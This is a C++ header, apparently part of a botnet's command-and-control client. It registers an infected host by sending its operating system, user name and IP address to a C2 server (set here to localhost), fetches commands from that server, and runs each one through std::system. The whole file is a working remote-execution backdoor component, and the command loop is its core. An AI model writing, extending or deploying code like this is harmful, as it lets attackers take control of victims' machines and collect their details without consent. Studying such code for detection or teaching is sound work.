#ifndef C2_HH
#define C2_HH

#include <string>

#include "request.hh"

const std::string C2_SERVER = "http://localhost:41450";
const std::string REGISTER_URI = "/convey/register/";
const std::string CMD_URI = "/convey/cmd/";
const std::string HASH_TYPE = "sha256sum";

namespace c2 {


std::string getRegParams (std::string hashSum, std::string os, std::string user, std::string ipAddr)
{
    std::string postForm =
        "hash_type=" + HASH_TYPE
        + "&hash_sum=" + hashSum
        + "&operating_sys=" + os
        + "&user=" + user
        + "&ip_addr=" + ipAddr;

    return postForm;
}


std::string getCmdParams (std::string hashSum, std::string ipAddr)
{
    std::string postForm =
        "hash_sum=" + hashSum
        + "&ip_addr=" + ipAddr;

    return postForm;
}


void registerBot(std::string postForm)
{
    std::string requestUri = C2_SERVER + REGISTER_URI;
    request::post(requestUri, postForm);
}


std::string getCmd (std::string postForm) {
    std::string requestUri = C2_SERVER + CMD_URI;
    std::string cmdText;
    cmdText = request::post(requestUri, postForm);

    return cmdText;
}


void runCmd (std::string cmd) {
    std::system(cmd.c_str());
}


} //namespace seed

#endif // C2_HH
